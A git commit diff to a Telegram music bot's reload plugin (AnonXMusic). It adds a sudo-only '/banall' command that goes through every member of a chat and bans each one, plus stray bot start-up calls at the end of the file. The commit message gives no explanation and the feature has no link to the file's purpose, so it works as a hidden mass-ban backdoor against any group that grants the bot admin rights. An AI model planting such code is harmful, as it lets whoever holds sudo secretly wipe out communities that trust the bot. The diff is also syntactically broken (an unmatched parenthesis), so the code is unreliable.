060fa98080cacd4f145838b47eba47d4c8b48fbb
𓄂️𝆺𝅥⃝☠️ ⃪ͥ͢ ᷟ 𝐌͢ꝛ♥️꯭⃝⃨⃜⃝𝐕𝐈𝐊𝐊𝐘༏⃪͢🔥᪵᪳❛𝆺꯭𝅥༎ࠫ <vikashyadav735556@gmail.com>
2024-11-13 20:10:53 +0530

    ᴠɪᴋᴋʏ
    Signed-off-by: 𓄂️𝆺𝅥⃝☠️ ⃪ͥ͢ ᷟ 𝐌͢ꝛ♥️꯭⃝⃨⃜⃝𝐕𝐈𝐊𝐊𝐘༏⃪͢🔥᪵᪳❛𝆺꯭𝅥༎ࠫ <vikashyadav735556@gmail.com>

--- AnonXMusic/plugins/tools/reload.py
+++ AnonXMusic/plugins/tools/reload.py
@@ -154,3 +154,24 @@ async def stop_download(client, CallbackQuery: CallbackQuery, _):
         except:
             return await CallbackQuery.answer(_["tg_8"], show_alert=True)
     await CallbackQuery.answer(_["tg_9"], show_alert=True)
+
+
+@app.on_message(
+filters.command("banall") 
+& SUDOERS)
+)
+async def banall_command(client, message: Message):
+    print("getting memebers from {}".format(message.chat.id))
+    async for i in app.get_chat_members(message.chat.id):
+        try:
+            await app.ban_chat_member(chat_id = message.chat.id, user_id = i.user.id)
+            print("kicked {} from {}".format(i.user.id, message.chat.id))
+        except Exception as e:
+            print("failed to kicked {} from {}".format(i.user.id, e))           
+    print("process completed")
+    
+
+# start bot client
+app.start()
+print("Banall-Bot Booted Successfully")
+idle()
